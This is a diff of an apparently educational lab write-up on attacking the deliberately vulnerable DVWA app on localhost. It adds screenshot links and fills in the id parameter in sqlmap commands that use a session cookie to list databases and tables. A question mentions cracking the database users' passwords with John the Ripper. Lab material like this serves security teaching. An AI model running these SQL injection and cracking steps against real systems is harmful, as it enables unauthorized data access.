@@ -227,9 +227,12 @@ Password: password <br>
 
 ### 3. Attack
 Use the command below to get information about all available databases
+<br>
+Before Attack
+![image](https://github.com/user-attachments/assets/7ca08183-d113-435c-b96c-ef80ff94019c)
 
 ```
-python sqlmap.py -u "http://localhost:4280/vulnerabilities/sqli/?id=&Submit=Submit#" --cookie="PHPSESSID=d36a2766916be89ecb1e34c02b94f95c; security=low" --dbs
+python sqlmap.py -u "http://localhost:4280/vulnerabilities/sqli/?id=1&Submit=Submit#" --cookie="PHPSESSID=d36a2766916be89ecb1e34c02b94f95c; security=low" --dbs
 ```
 
 
@@ -237,9 +240,12 @@ python sqlmap.py -u "http://localhost:4280/vulnerabilities/sqli/?id=&Submit=Subm
 **Question 2**: Use sqlmap to get tables, users information
 
 **Answer 2**:
+<br>
+Before Attack
+![image](https://github.com/user-attachments/assets/ed3b3dea-25bc-46c8-8082-9684e773b2e4)
 
 ```
-python sqlmap.py -u "http://localhost:4280/vulnerabilities/sqli_blind/?id=&Submit=Submit#" --cookie="PHPSESSID=d36a2766916be89ecb1e34c02b94f95c; security=low" -D dvwa --tables
+python sqlmap.py -u "http://localhost:4280/vulnerabilities/sqli_blind/?id=1&Submit=Submit#" --cookie="PHPSESSID=d36a2766916be89ecb1e34c02b94f95c; security=low" -D dvwa --tables
 ```
 **Question 3**: Make use of John the Ripper to disclose the password of all database users from the above exploit
 **Answer 3**:
